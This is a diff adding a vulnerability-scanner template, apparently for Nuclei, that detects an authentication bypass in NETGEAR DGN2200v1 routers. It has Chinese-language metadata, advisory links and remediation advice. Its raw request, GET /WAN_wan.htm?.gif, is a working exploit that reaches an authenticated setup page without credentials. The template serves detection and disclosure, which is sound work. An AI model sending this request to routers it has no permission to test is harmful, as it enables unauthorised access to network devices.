@@ -1,0 +1,38 @@
+id: netgear-router-auth-bypass
+info:
+  name: NETGEAR DGN2200v1 Router Authentication Bypass
+  author:
+  - l0ne1y
+  tags:
+  - netgear
+  - auth-bypass
+  - router
+  description: |-
+    NETGEAR DGN2200v1 路由器身份验证绕过漏洞
+    NETGEAR DGN2200v1是一款N300无线ADSL2+调制解调器路由器。
+    如果页面具有“.jpg”、“.gif”或“ess_”等字符串，NETGEAR DGN2200v1 路由器不需要身份验证就可以访问设备上的任何页面，包括那些需要身份验证的。
+  reference:
+  - https://www.microsoft.com/security/blog/2021/06/30/microsoft-finds-new-netgear-firmware-vulnerabilities-that-could-lead-to-identity-theft-and-full-system-compromise/
+  - https://kb.netgear.com/000062646/security-advisory-for-multiple-httpd-authentication-vulnerabilities-on-dgn2200v1
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1、建议用户到官方获取最新补丁或者最新版本程序：https://kb.netgear.com
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    words:
+    - <title>WAN Setup</title>
+  matchers-condition: and
+  raw:
+  - |
+    GET /WAN_wan.htm?.gif HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  - |
+    GET /WAN_wan.htm?.gif HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
